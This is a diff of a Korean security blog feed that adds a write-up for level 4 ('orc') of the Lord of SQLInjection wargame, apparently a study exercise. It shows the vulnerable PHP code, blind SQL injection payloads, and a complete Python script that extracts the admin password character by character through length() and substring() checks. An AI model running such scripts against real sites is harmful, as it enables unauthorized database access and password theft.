@@ -752,7 +752,7 @@ section 진행 기간
 <p>워게임 문제같은 경우에는 <code>Docker</code>에 구축하였습니다.</p>
 <br>
 
-<h3 id="왜-도커에-구축"><a href="#왜-도커에-구축" class="headerlink" title="왜 도커에 구축?"></a>왜 도커에 구축?</h3><p>워게임 문제같은 경우에는 문제 의도 상 취약하게 만들어야 하기 때문에 같은 서버에서 서비스하게 되면 메인 시스템에 악영향을 끼치는 의도치 못한 상황이 발생할 수 있기 때문에 <code>Docker</code>에 구축하였습니다.</p>
+<h3 id="왜-도커에-구축"><a href="#왜-도커에-구축" class="headerlink" title="왜 도커에 구축?"></a>왜 도커에 구축?</h3><p>워게임 문제같은 경우에는 문제 의도 상 취약하게 만들어야 합니다. 만약 같은 서버에서 서비스하게 되면 메인 시스템에 악영향을 끼치는 의도치 못한 상황이 발생할 수 있기 때문에 <code>Docker</code>에 구축하였습니다.</p>
 <br>
 
 <br>
@@ -1375,6 +1375,151 @@ section 진행 기간
 
 <p>쿼리문에 <code>select id from prob_goblin where id=&#39;guest&#39; and no=2 or id=0x61646d696e</code> 이렇게 들어가면</p>
 <p><code>id=&#39;gest&#39; and no=2</code>는 거짓이 되고 <code>id=0x61646d696e</code>가 들어가게 됩니다.</p>
+<br>
+
+<blockquote>
+<p>SOLVED !!!</p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>Lord of SQLInjection</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
+        <tag>Write Up</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>[Lord of SQLInjection] [4번_orc] Write UP</title>
+    <url>/2021/09/28/2021-09-28-Lord_of_SQLInjection_4_orc/</url>
+    <content><![CDATA[<h1 id="🎨-전체-소스코드"><a href="#🎨-전체-소스코드" class="headerlink" title="🎨 전체 소스코드"></a>🎨 전체 소스코드</h1><br>
+
+<p>4번 문제인 orc를 클릭하면 아래와 같이 소스코드와 쿼리문이 나옵니다.</p>
+<br>
+
+<img src="/images/Lord of SQLInjection/orc/source.png">
+
+<br>
+
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>; </span><br><span class="line">  login_chk(); </span><br><span class="line">  <span class="variable">$db</span> = dbconnect(); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select id from prob_orc where id=&#x27;admin&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class="line">  <span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>]) <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;Hello admin&lt;/h2&gt;&quot;</span>; </span><br><span class="line">   </span><br><span class="line">  <span class="variable">$_GET</span>[pw] = addslashes(<span class="variable">$_GET</span>[pw]); </span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select pw from prob_orc where id=&#x27;admin&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class="line">  <span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line">  <span class="keyword">if</span>((<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>]) &amp;&amp; (<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>] == <span class="variable">$_GET</span>[<span class="string">&#x27;pw&#x27;</span>])) solve(<span class="string">&quot;orc&quot;</span>); </span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<br>
+
+<br>
+
+<hr>
+<br>
+
+<h1 id="🔔-중요-소스코드-해석"><a href="#🔔-중요-소스코드-해석" class="headerlink" title="🔔 중요 소스코드 해석"></a>🔔 중요 소스코드 해석</h1><br>
+
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select id from prob_orc where id=&#x27;admin&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class="line"><span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>]) <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;Hello admin&lt;/h2&gt;&quot;</span>; </span><br><span class="line"></span><br><span class="line"><span class="variable">$_GET</span>[pw] = addslashes(<span class="variable">$_GET</span>[pw]); </span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select pw from prob_orc where id=&#x27;admin&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class="line"><span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line"><span class="keyword">if</span>((<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>]) &amp;&amp; (<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>] == <span class="variable">$_GET</span>[<span class="string">&#x27;pw&#x27;</span>])) solve(<span class="string">&quot;orc&quot;</span>); </span><br></pre></td></tr></table></figure>
+
+<p><code>조건문</code>과 <code>query문</code>, <code>addslashes 함수</code>, <code>pw</code> 변수 값과 <code>GET으로 받아온 pw 파라미터 값</code>이 같아야 한다는 <code>조건문</code>이 있습니다.</p>
+<br>
+
+<br>
+
+<h2 id="첫번째-줄-해석"><a href="#첫번째-줄-해석" class="headerlink" title="첫번째 줄 해석"></a>첫번째 줄 해석</h2><p><code>preg_match</code>라는 함수가 있습니다.</p>
+<p><code>preg_match</code>함수는 특정한 문자를 필터링할 때 사용합니다.</p>
+<p><code>prob</code>문자열과 특수문자 <code>_</code> <code>.</code> <code>()</code> 를 필터링 하고있습니다. <code>/i</code>는 대소문자를 구분하지 않는다는 뜻입니다.</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br></pre></td></tr></table></figure>
+
+<br>
+
+<br>
+
+<h2 id="두번째-amp-세번째-amp-네번째-줄-해석"><a href="#두번째-amp-세번째-amp-네번째-줄-해석" class="headerlink" title="두번째 &amp; 세번째 &amp; 네번째 줄 해석"></a>두번째 &amp; 세번째 &amp; 네번째 줄 해석</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select id from prob_orc where id=&#x27;admin&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class="line"><span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>]) <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;Hello admin&lt;/h2&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p><code>prob_orc</code> 테이블에서 <code>id</code>가 <code>admin</code>이고 <code>pw</code>가 참이면 <code>id</code> 값을 <code>query</code>변수에 저장하고 있습니다.</p>
+<p>만약 <code>result[&#39;id&#39;]</code>가 있다면 Hello admin을 출력시킵니다.</p>
+<br>
+
+<br>
+
+<h2 id="여섯번째-줄-해석"><a href="#여섯번째-줄-해석" class="headerlink" title="여섯번째 줄 해석"></a>여섯번째 줄 해석</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_GET</span>[pw] = addslashes(<span class="variable">$_GET</span>[pw]);</span><br></pre></td></tr></table></figure>
+
+<p><code>addslashes</code>함수는 <code>&#39;</code>, <code>&quot;</code>, <code>NULL</code> 같은 특수 문자들을 포함하고 있는 문자열에 <code>\</code>을 넣음으로써 쿼리문에서의 오류를 없애줍니다.</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">예) pw 가 passwd&#x27;s 이면</span><br><span class="line">   </span><br><span class="line">&quot;select id from prob_orc where id=&#x27;admin&#x27; and pw=&#x27;passwd&#x27;s&#x27;&quot; → 오류</span><br><span class="line">&quot;select id from prob_orc where id=&#x27;admin&#x27; and pw=&#x27;passwd\&#x27;s&#x27;&quot; → &#x27;를 \&#x27;로 바꿔줍니다</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<br>
+
+<h2 id="일곱번째-amp-여덟번째-amp-아홉번째-줄-해석"><a href="#일곱번째-amp-여덟번째-amp-아홉번째-줄-해석" class="headerlink" title="일곱번째 &amp; 여덟번째 &amp; 아홉번째 줄 해석"></a>일곱번째 &amp; 여덟번째 &amp; 아홉번째 줄 해석</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select pw from prob_orc where id=&#x27;admin&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class="line"><span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line"><span class="keyword">if</span>((<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>]) &amp;&amp; (<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>] == <span class="variable">$_GET</span>[<span class="string">&#x27;pw&#x27;</span>])) solve(<span class="string">&quot;orc&quot;</span>); </span><br></pre></td></tr></table></figure>
+
+<p><code>addslashes</code>함수로 <code>&#39;</code>, <code>&quot;</code>, <code>NULL</code>을 필터링 한 쿼리문을 다시 실행시키고 <code>result[&#39;pw&#39;]</code>값과 <code>GET 으로 받은 pw 파라미터</code> 값이 같으면 문제가 풀립니다.</p>
+<br>
+
+<br>
+
+<hr>
+<br>
+
+<h1 id="🙆‍♀️-SOLVE"><a href="#🙆‍♀️-SOLVE" class="headerlink" title="🙆‍♀️ SOLVE"></a>🙆‍♀️ SOLVE</h1><br>
+
+<img src="/images/Lord of SQLInjection/orc/solve_1.png">
+
+<br>
+
+<p><code>pw</code> 파라미터를 참으로 만들어주니 Hello admin이 출력되었습니다.</p>
+<p>이제 중간에 <code>addslashes</code>함수를 우회하고 <code>result[&#39;pw&#39;]</code> 값을 알아내야합니다.</p>
+<br>
+
+<br>
+
+<p> <code>pw</code>를 알아내기 위해 <code>Blind SQL Injection</code>을 사용하였습니다.</p>
+<p><code>?pw=1&#39; or id=&#39;admin&#39; and length(pw)=&#39;1</code> 이렇게 mysql의 <code>length</code> 함수를 사용하여 길이를 구하고 <code>?pw=1&#39; or id=&#39;admin&#39; and substring(pw,1,1)=&#39;0</code> mysql의 <code>substring</code> 함수를 사용하여 <code>pw</code>를 하나 씩 추출하여 참인지 확인해야 합니다.</p>
+<p><code>substring(str, pos, len)</code> 함수에서 <code>str</code> 인자는 원본 문자열이고 <code>pos</code> 인자는 시작 위치 값, <code>len</code> 인자는 가져올 길이 값 입니다.</p>
+<p>예를 들어 <code>substring(pw, 1, 1)</code> 이면 <code>pw</code> 문자열에서 <code>첫번째 위치</code>에 있는 문자 <code>한 개</code> 추출해 오는 것 입니다.</p>
+<br>
+
+<p><code>pw</code>의 길이부터 <code>숫자 0~9</code>까지 <code>알파벳 대소문자 a~z</code>까지 하나 씩 구해야 하기 때문에 시간이 많이 필요합니다.</p>
+<p>파이썬을 통해 자동으로 빠르게 <code>pw</code>값을 추출할 수 있습니다.</p>
+<br>
+
+<br>
+
+<h2 id="파이썬-코드"><a href="#파이썬-코드" class="headerlink" title="파이썬 코드"></a>파이썬 코드</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw=1&#x27; or id=&#x27;admin&#x27; and &quot;</span></span><br><span class="line">head = &#123;<span class="string">&#x27;Cookie&#x27;</span> : <span class="string">&#x27;PHPSESSID=hs9ec08q7cfg9e4b8opujaufgg&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">length = <span class="number">1</span></span><br><span class="line">pwd = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">    query = <span class="string">&quot;length(pw)=&#x27;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(length)</span><br><span class="line">    req = requests.get(url+query, headers=head)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[ +&quot;</span>,length,<span class="string">&quot;]&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;Hello admin&quot;</span> <span class="keyword">in</span> req.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;총 길이는&quot;</span>,length)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        length = length + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length+<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>, <span class="number">122</span>):</span><br><span class="line">        query = <span class="string">&quot;substring(pw,&#123;&#125;,1) = &#x27;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(i),<span class="built_in">chr</span>(j))</span><br><span class="line">        req = requests.get(url+query, headers=head)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Hello admin&quot;</span> <span class="keyword">in</span> req.text:</span><br><span class="line">            <span class="built_in">print</span>(pwd)</span><br><span class="line">            pwd = pwd + <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">            </span><br><span class="line"><span class="built_in">print</span>(pwd)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>url을 적어 줍니다. <code>?pw=1&#39; or id=&#39;admin&#39; and </code>까지 동일하기 때문에 이 부분까지 작성하였습니다.</p>
+<p>본 워게임 사이트는 로그인이 필요한 사이트이므로 쿠키 값을 head 변수에 넣어줬습니다.</p>
+<br>
+
+<p>먼저 <code>pw</code>의 길이를 구해줬습니다.</p>
+<p>무한 루프를 돌려 “Hello admin” 이라는 문자열이 나올때까지 <code>length</code>값을 1씩 더해줍니다.</p>
+<br>
+
+<p><code>substring</code> 함수를 사용한 문자 추출은 중첩 반복문을 사용해 구해줬습니다.</p>
+<p><code>i</code>는 1부터 <code>length + 1</code> 값 까지 돌아갑니다.</p>
+<p><code>j</code>는 아스키코드 <code>48 ~ 122</code>까지 돌아갑니다.</p>
+<br>
+
+<img src="/images/Lord of SQLInjection/orc/solve_2.png">
+
+<br>
+
+<p>자동으로 <code>pw</code>의 길이를 구해 줍니다.</p>
+<br>
+
+<br>
+
+<img src="/images/Lord of SQLInjection/orc/solve_3.png">
+
+<br>
+
+<p>자동으로 <code>pw</code>의 값을 구해 줍니다.</p>
+<br>
+
+<br>
+
+<p>파이썬 코드를 돌려서 나온 <code>pw</code> 값을 넣어주면 문제가 풀립니다.</p>
+<img src="/images/Lord of SQLInjection/orc/solve_4.png">
+
+<br>
+
+<p><code>substring</code>으로 4번째 문자를 추출해보면 ‘A’ 대문자인데? Clear가 안되어 소문자 ‘a’를 써주니 Clear 됐다!</p>
 <br>
 
 <blockquote>
